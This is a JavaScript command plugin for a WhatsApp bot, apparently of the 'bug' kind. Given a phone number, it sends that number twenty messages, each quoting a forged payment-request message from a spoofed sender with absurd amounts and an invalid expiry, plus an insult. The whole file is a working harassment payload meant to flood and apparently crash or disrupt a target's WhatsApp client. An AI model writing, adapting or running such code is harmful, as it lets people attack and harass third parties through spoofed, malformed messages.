const { default: ms } = require('ms'); // Mengimpor pustaka ms
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const handler = async (m, { hanz, text, command, participants }) => {
    if (!text) return m.reply('Contoh Penggunaan Command <nomor>');
    
    const num = text + '@s.whatsapp.net';
    
    const vyn = {
        key: {
            remoteJid: '0@s.whatsapp.net',
            fromMe: false,
            id: 'Rangel°᭄ᴮᵒᵗ',
            participant: '0@s.whatsapp.net'
        },
        message: {
            requestPaymentMessage: {
                currencyCodeIso4217: "USD",
                amount1000: 999999999,
                requestFrom: '0@s.whatsapp.net',
                noteMessage: {
                    extendedTextMessage: {
                        text: 'Rangel°᭄ᴮᵒᵗ By єнαηz'
                    }
                },
                expiryTimestamp: 999999999,
                amount: {
                    value: 91929291929,
                    offset: 1000,
                    currencyCode: "USD"
                }
            }
        }
    };

    const jumlah = 20; // Asumsikan ini adalah angka, bukan string
    const waktu = '15s'; // Ini tidak digunakan di kode, bisa dihapus jika tidak diperlukan

    for (let i = 0; i < jumlah; i++) {
        await hanz.sendMessage(m.chat, { react: { key: m.key, text: '😁' } });
        await hanz.sendMessage(num, { text: 'WA GB ANJEENG' }, { quoted: vyn });
        await sleep(1000);
    }
};

handler.command = /^(bugpayment)$/i;
handler.premium = false;
handler.owner = true;

module.exports = handler;